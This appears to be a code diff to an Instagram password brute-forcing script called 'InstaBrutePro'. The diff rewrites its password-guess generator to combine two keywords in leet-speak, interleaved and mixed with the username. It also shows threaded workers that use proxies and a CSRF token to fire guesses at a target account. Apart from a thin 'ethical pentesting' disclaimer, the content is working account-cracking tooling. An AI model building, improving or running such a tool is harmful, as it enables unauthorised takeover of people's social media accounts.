@@ -31,7 +31,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v2.0 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v2.1 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Ultimate Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -67,7 +67,7 @@ def load_checkpoint():
         return None
 
 def leet_speak(keyword):
-    """Generate leet speak variations (e.g., ghh -> g4h, ghH)."""
+    """Generate leet speak variations (e.g., apple -> 4ppl3)."""
     replacements = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$']}
     variations = [keyword]
     for char, subs in replacements.items():
@@ -78,39 +78,47 @@ def leet_speak(keyword):
         variations.extend(new_variations)
     return list(set(variations))
 
+def interleave_keywords(keyword1, keyword2):
+    """Interleave two keywords (e.g., apple, 2511 -> ap25ple11)."""
+    result = []
+    min_len = min(len(keyword1), len(keyword2))
+    interleaved = ''
+    for i in range(min_len):
+        interleaved += keyword1[i] + keyword2[i]
+    if len(keyword1) > min_len:
+        interleaved += keyword1[min_len:]
+    if len(keyword2) > min_len:
+        interleaved += keyword2[min_len:]
+    result.append(interleaved)
+    return result
+
 def generate_variations(keywords, username, max_variations=1000):
-    """Generate password variations with keyword combinations."""
+    """Generate password variations with two-keyword combos."""
     variations = set()
-    common_suffixes = ['123', '2025', '2024', '2023', 'ig', 'insta', 'pass', '', '456', '789', '!']
-    common_prefixes = ['my', 'the', '123', 'insta', 'ig', '', 'test', 'super']
     username_parts = [username] + username.split('123')[:1]  # e.g., testuser123 -> testuser
 
     # Single keywords and leet variations
     for keyword in keywords:
         for leet_var in leet_speak(keyword):
             variations.add(leet_var)
-            for prefix in common_prefixes:
-                for suffix in common_suffixes:
-                    variations.add(f"{prefix}{leet_var}{suffix}")
-                    variations.add(f"{leet_var}{suffix}")
-                    variations.add(f"{prefix}{leet_var}")
             for part in username_parts:
                 variations.add(f"{part}{leet_var}")
                 variations.add(f"{leet_var}{part}")
 
-    # Combine keywords (up to 2 keywords)
-    for combo in itertools.permutations(keywords, min(2, len(keywords))):
-        combo_str = ''.join(combo)
-        for leet_var in leet_speak(combo_str):
-            variations.add(leet_var)
-            for prefix in common_prefixes:
-                for suffix in common_suffixes:
-                    variations.add(f"{prefix}{leet_var}{suffix}")
-                    variations.add(f"{leet_var}{suffix}")
-                    variations.add(f"{prefix}{leet_var}")
-            for part in username_parts:
-                variations.add(f"{part}{leet_var}")
-                variations.add(f"{leet_var}{part}")
+    # Two-keyword combinations
+    for combo in itertools.permutations(keywords, 2):
+        keyword1, keyword2 = combo
+        for leet1 in leet_speak(keyword1):
+            for leet2 in leet_speak(keyword2):
+                # Direct concatenation
+                variations.add(f"{leet1}{leet2}")
+                variations.add(f"{leet2}{leet1}")
+                # Interleaved
+                variations.update(interleave_keywords(leet1, leet2))
+                # Username-based
+                for part in username_parts:
+                    variations.add(f"{part}{leet1}{leet2}")
+                    variations.add(f"{leet1}{leet2}{part}")
 
     return list(variations)[:max_variations]
 
@@ -335,10 +343,10 @@ def main():
     queue = Queue()
     for i, word in enumerate(words):
         queue.put(word)
-        if i % 1000 == 0 and i > 0:  # Save checkpoint every 1000 passwords
+        if i % 1000 == 0 and i > 0:  # Save checkpoint every 1000 attempts
             save_checkpoint(args.u, args.w, i)
 
-    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with advanced variations... Buckle up!{Colors.NC}")
+    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with two-keyword combos... Buckle up!{Colors.NC}")
     with ThreadPoolExecutor(max_workers=args.t) as exec:
         futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
         for future in futures:
